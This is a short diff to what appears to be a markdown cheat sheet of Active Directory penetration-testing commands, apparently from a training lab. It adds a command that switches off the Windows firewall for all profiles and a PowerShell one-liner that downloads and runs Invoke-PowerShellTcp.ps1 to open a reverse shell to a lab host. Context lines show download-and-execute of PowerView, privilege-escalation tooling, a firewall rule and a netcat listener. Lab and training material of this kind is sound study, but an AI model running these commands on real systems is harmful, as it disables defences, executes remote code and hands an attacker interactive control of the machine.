@@ -33,6 +33,8 @@ iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps
 C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
 . C:\AD\Tools\PowerUp.ps1
 New-NetFirewallRule -DisplayName "Allow Inbound Traffic" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8001
+netsh advfirewall set allprofiles state off
+powershell.exe iex (iwr http://172.16.100.53/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.53 -Port 443
 C:\AD\Tools\netcat-win32-1.12\nc64.exe -lnvp 8001
 
 ```
